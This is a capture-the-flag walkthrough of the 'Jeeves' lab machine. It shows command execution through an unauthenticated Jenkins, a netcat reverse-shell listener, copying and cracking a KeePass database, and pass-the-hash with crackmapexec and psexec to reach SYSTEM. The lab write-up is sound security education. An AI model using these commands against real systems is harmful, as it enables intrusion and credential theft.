# Jeeves
Jeeves: A Walkthrough by Mursalin
===============================

Jeeves first appeared on HTB back in 2017, and I originally tackled it in 2018. Coming back to it years later is a fun reminder of how the box introduced tricks that were novel at the time: an unauthenticated Jenkins instance, a KeePass database harbouring a raw NTLM hash, and a root flag hidden inside an alternate data stream. Let’s walk through the steps, modernising the tools a bit but keeping the classic flavour.

Box Info
--------

| Field        | Value |
|--------------|-------|
| Name         | Jeeves |
| OS           | Windows |
| Difficulty   | Medium |
| Release      | 11 Nov 2017 |
| Retire       | 19 May 2018 |
| User blood   | 00:19:52 (original: CTFPiggy) |
| Root blood   | 03:53:41 (original: arkantolo) |
| Creator      | mrb3n |

Recon
-----

### nmap

A full TCP scan reveals four open ports:

```bash
mursalin@kali$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.57
...
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
```

Service detection shows IIS on port 80, Windows RPC/SMB, and a Jetty webserver on port 50000:

```bash
mursalin@kali$ nmap -p 80,135,445,50000 -sCV -oA scans/nmap-tcpscripts 10.10.10.57
...
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The SMB scripts suggest Windows 10 or Server 2016, and the IIS version confirms a relatively modern Windows build.

Website – TCP 80
-----------------

The front page is a parody of “Ask Jeeves” with a search box. Submitting anything leads to `/error.html`, which displays a generic ASP.NET error about a failed database connection. The form itself does nothing useful.

A directory brute‑force with `feroxbuster` (using the SecLists `raft-medium-directories.txt`) turns up nothing. Back in 2017, the go‑to wordlist was `directory-list-2.3-medium.txt` from DirBuster. That original list finds `/askjeeves` on the other webserver, which we’ll examine shortly.

SMB – TCP 445
-------------

Null sessions are blocked:

```bash
mursalin@kali$ smbclient -N -L //10.10.10.57
session setup failed: NT_STATUS_ACCESS_DENIED
```

We’ll need credentials later.

HTTP – TCP 50000
-----------------

The root path returns a 404 with a Jetty‑branded error page. The response header `Server: Jetty(9.4.z-SNAPSHOT)` tells us this is a Java servlet container.

When I originally solved Jeeves, the DirBuster medium list unearthed an interesting endpoint:

```bash
mursalin@kali$ gobuster -u http://10.10.10.57:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
...
/askjeeves (Status: 302)
```

Modern wordlists like `raft-medium-directories.txt` often miss this directory. A valuable lesson: older boxes sometimes require older wordlists, and it’s good practice to try several.

### Jenkins – `/askjeeves`

Navigating to `http://10.10.10.57:50000/askjeeves` brings up a Jenkins dashboard with no authentication required.

![Jenkins dashboard](image-20220412191421029)

Shell as kohsuke
----------------

### Execution via Freestyle Job

1. Click **New Item**, give it any name (e.g., “mursalin”), select **Freestyle project**.
2. Scroll to **Build** section, add a **Execute Windows batch command** step.
3. Enter a test command: `cmd /c whoami`.
4. Save, then click **Build Now**. In the console output we see `jeeves\kohsuke`.

Now we can use a reverse shell. I’ll grab a PowerShell one‑liner from revshells.com (e.g., PowerShell #3 Base64 encoded).

Set up a listener:

```bash
mursalin@kali$ sudo rlwrap -cAr nc -lvnp 445
```

Replace the build command with the PowerShell payload and run the job again. A shell arrives as `kohsuke`:

```
whoami
jeeves\kohsuke
PS C:\Users\Administrator\.jenkins\workspace\mursalin>
```

The working directory is inside `Administrator`’s profile, but we can’t read anything there. Let’s grab the user flag from `kohsuke`’s desktop:

```powershell
PS C:\Users\kohsuke\desktop> cat user.txt
e3232272************************
```

### Alternative: Script Console

Jenkins also offers a **Script Console** under **Manage Jenkins**. A Groovy command such as `println "cmd.exe /c whoami".execute().text` runs commands directly on the host. The same reverse‑shell one‑liner can be pasted there to obtain a shell.

Shell as Administrator
----------------------

### Enumerating the KeePass Database

In `C:\Users\kohsuke\Documents` there’s a single file:

```
-a----  9/18/2017  1:43 PM  2846 CEH.kdbx
```

A KeePass database! We can exfiltrate it by copying to the Jenkins workspace:

```powershell
PS C:\Users\Administrator\.jenkins\workspace\mursalin> copy \users\kohsuke\Documents\CEH.kdbx .
```

Now the Jenkins web interface shows the file under “Workspace”. Download it, then delete the copy.

### Cracking the Master Password

Use `keepass2john` to extract a hash:

```bash
mursalin@kali$ keepass2john CEH.kdbx > CEH.kdbx.hash
```

Crack it with hashcat (mode 13400 for KeePass):

```bash
mursalin@kali$ hashcat -m 13400 CEH.kdbx.hash /usr/share/wordlists/rockyou.txt --user
...
$keepass$*2*6000*0*...:moonshine1
```

The master password is **moonshine1**.

### Extracting Credentials

Open the database with `kpcli`:

```bash
mursalin@kali$ kpcli --kdb CEH.kdbx
Please provide the master password: *************************
kpcli:/> find .
```

There are several entries, notably:

- **Backup stuff** – contains `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`
- **DC Recovery PW** – `administrator : S1TjAtJHKsugh9oC4VZl`
- Others with various usernames and passwords.

The “Backup stuff” entry looks like an LM:NT hash pair.

### Pass‑the‑Hash

Windows authenticates using the hash, not the plaintext password. We can directly pass the NT hash to any tool that supports pass‑the‑hash. Testing with `crackmapexec`:

```bash
mursalin@kali$ crackmapexec smb 10.10.10.57 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
SMB  10.10.10.57  445  JEEVES  [+] Jeeves\Administrator (Pwn3d!)
```

The `(Pwn3d!)` flag indicates administrative access. The LM hash (`aad3...`) is the well‑known “empty” LM hash and can be ignored.

### Getting a SYSTEM Shell

Using Impacket’s `psexec.py`:

```bash
mursalin@kali$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.57 cmd.exe
...
C:\Windows\system32> whoami
nt authority\system
```

### root.txt in an Alternate Data Stream

On the Administrator’s desktop there’s no `root.txt`. Instead we find `hm.txt`:

```
C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

Checking for NTFS alternate data streams with `dir /R` reveals:

```
hm.txt:root.txt:$DATA
```

Read the stream using `more < hm.txt:root.txt`:

```
C:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4************************
```

That’s the root flag!

Conclusion
----------

Jeeves remains a delightful box that demonstrates how a Jenkins instance without authentication, a KeePass database storing raw hashes, and a hidden ADS can combine into a creative privilege‑escalation path. Revisiting it after so many years is a good reminder that “classic” techniques never truly go out of style – they just need the right context.

~ Mursalin
